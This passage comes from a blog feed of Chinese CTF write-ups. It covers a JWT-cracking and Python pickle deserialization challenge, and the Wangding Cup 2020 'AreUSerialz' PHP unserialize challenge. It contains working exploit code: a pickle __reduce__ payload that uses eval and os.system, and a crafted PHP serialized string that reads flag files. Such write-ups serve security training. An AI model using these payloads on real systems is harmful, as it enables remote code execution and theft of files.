<p><img src="https://img-blog.csdnimg.cn/20200411195706443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>没这么多钱，抓包修改折扣（典型的逻辑漏洞）<br><img src="https://img-blog.csdnimg.cn/20200411200006617.png" alt="在这里插入图片描述"><br>新知识：<br>JSON Web Token破解 JWT类似于cookie，<br><a href="https://www.cnblogs.com/cjsblog/p/9277677.html" target="_blank" rel="noopener">JWT讲解</a><br>回到购物车抓包，可以发现存在JWT<br><img src="https://img-blog.csdnimg.cn/20200411201051735.png" alt="在这里插入图片描述"><br>根据文章讲述，进行base64编码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"alg"</span>:<span class="string">"HS256"</span>,<span class="string">"typ"</span>:<span class="string">"JWT"</span>&#125;&#123;<span class="string">"username"</span>:<span class="string">"123456"</span>&#125;wÈRî*·Sq(W¶íW3Ì¬¬kô<span class="number">1</span>Ì<span class="number">7</span>½½<span class="number">0</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200411201512135.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200411201733792.png" alt="在这里插入图片描述"><br>username是我们的用户名,后面出现乱码是因为经过了sha256，要破解密匙</p>
<p><a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">破解工具</a><br>放到kali下<br><img src="https://img-blog.csdnimg.cn/20200411202937197.png" alt="在这里插入图片描述"><br>密匙是1Kun</p>
<p><a href="https://jwt.io/" target="_blank" rel="noopener">去官网编码</a><br><img src="https://img-blog.csdnimg.cn/20200411210157276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再回去改cookie，成功进去<br><img src="https://img-blog.csdnimg.cn/20200411210214203.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看源码发现一个zip，下载下来<br><img src="https://img-blog.csdnimg.cn/20200411210532295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解压后一堆python…….<br>代码审计<br><a href="https://blog.csdn.net/SKI_12/article/details/85015803" target="_blank" rel="noopener">python反序列化讲解</a><br>文章中提到cPickle，与pickle是一致的，所以不影响。<br>看到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span><span class="params">(BaseHandler)</span>:</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">"admin"</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=<span class="string">'This is Black Technology!'</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'no_ass.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">'become'</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=<span class="string">'This is Black Technology!'</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p><strong>漏洞产生的原因在于其可以将自定义的类进行序列化和反序列化。反序列化后产生的对象会在结束时触发<strong>reduce</strong>()函数从而触发恶意代码。</strong><br>其实反序列化漏洞思路都是差不多的<br>就是找到序列化的参数，看他可不可以修改，可以修改就可以进行任意文件读取或者命令执行<br>这里我们可以修改become这个参数</p>
<p>那我们就重写<strong>reduce</strong>()魔法方法<br>可能buu环境有点问题不能够这样重新</p>
<p>def <strong>reduce</strong>(self):<br>   return eval,(“<strong>import</strong>(‘os’).system(‘ls /‘)”,)</p>
<p>代码如下<br>python2环境下，可以放到kali中进行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">       <span class="keyword">return</span> (eval, (<span class="string">"open('/flag.txt','r').read()"</span>,))    <span class="comment">#打开读取flag.txt的内容</span></span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())  <span class="comment">#序列化payload</span></span><br><span class="line">a = urllib.quote(a)  <span class="comment">#进行url编码</span></span><br><span class="line"><span class="keyword">print</span> a</span><br></pre></td></tr></table></figure>
<p>运行后<br><img src="https://img-blog.csdnimg.cn/20200411215242459.png" alt="在这里插入图片描述"><br>传入become<br><img src="https://img-blog.csdnimg.cn/20200411215403382.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎杯2020--web</title>
    <url>/2020/05/14/%E7%BD%91%E9%BC%8E%E6%9D%AF2020/</url>
    <content><![CDATA[<h1 id="AreUSerialz"><a href="#AreUSerialz" class="headerlink" title="AreUSerialz"></a>AreUSerialz</h1><a id="more"></a>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $op = <span class="string">"1"</span>;</span><br><span class="line">        $filename = <span class="string">"/tmp/tmpfile"</span>;</span><br><span class="line">        $content = <span class="string">"Hello World!"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();       </span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((string)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $res = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">	</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">'str'</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[<span class="string">'str'</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"sdadasd"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20200510155622469.png" alt="在这里插入图片描述"><br>很明显有个高危函数<br>file_get_contents()<br><img src="https://img-blog.csdnimg.cn/20200510161454148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>只有当属性 op = 2 的时候才能调用read()方法<br><img src="https://img-blog.csdnimg.cn/2020051016153657.png" alt="在这里插入图片描述"><br>但是__destruct方法会定死属性op为 1</p>
<p>这个绕过其实很容易<br>由于php是一门弱类型的语言,让属性op等于一个整形的数字<br>例如<br><img src="https://img-blog.csdnimg.cn/20200510163113387.png" alt="**加粗样式**在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200510163125800.png" alt="在这里插入图片描述"><br>他是返回true<br>但是这个类里的变量是受保护的变量，<br><img src="https://img-blog.csdnimg.cn/20200510194406143.png" alt="在这里插入图片描述"><br><strong>序列化后变量会带\0*\0  \0的ascii码是0.所以不会满足上面的函数的if，从而不能通过<br>php7.1+版本对属性类型不敏感因此我们强行改变他的变量类型为公有变量，就可以利用弱类型绕过了</strong></p>
<p>exp如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">public</span> $op = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename = <span class="string">"flag.php"</span>;</span><br><span class="line">    <span class="keyword">public</span> $content = <span class="string">"a"</span>;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="comment">//echo urlencode(serialize($a));</span></span><br><span class="line"><span class="keyword">echo</span><span class="string">"&lt;br/&gt;"</span>.serialize($a);</span><br></pre></td></tr></table></figure>


<p>但是他原来的类型是受保护的，直接将生成的paylaod传过去是不会输出flag.php的。（但是在buu上的靶机可以……）我也整不明白<br><img src="https://img-blog.csdnimg.cn/20200510165435589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我改了下content，使之字符长度与字符内容不一致（我暂时也不知道为什么）</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">str&#x3D;O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:1:&quot;ab&quot;;&#125;</span><br></pre></td></tr></table></figure>


<p>成功输出flag.php</p>
<p><img src="https://img-blog.csdnimg.cn/20200510165711734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>-writeup</tag>
      </tags>
  </entry>
</search>
